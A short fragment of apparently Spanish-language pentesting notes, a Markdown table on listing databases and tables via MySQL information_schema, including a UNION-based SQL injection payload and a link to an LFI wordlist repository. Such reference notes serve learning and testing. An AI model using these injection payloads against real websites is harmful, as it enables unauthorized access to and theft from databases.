...
| ------------------------- | ----------------------------- | ---------------- | ----------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| Ver bases de datos        | `information_schema.schemata` | `schema_name`    | `SELECT schema_name FROM information_schema.schemata` |              select group_concat(schema_name) from information_schema.schemata						               |
| Ver tablas de una DB      | `information_schema.tables`   | `table_name`     | `SELECT table_name FROM information_schema.tables`    | `SELECT table_name FROM information_schema.tables WHERE table_schema='usage_blog'`/ Gifts'UNION SELECT null,table_name from information_schema.tables--                             |
...
> https://github.com/Chocapikk/LFIHunt/tree/main/wordlists
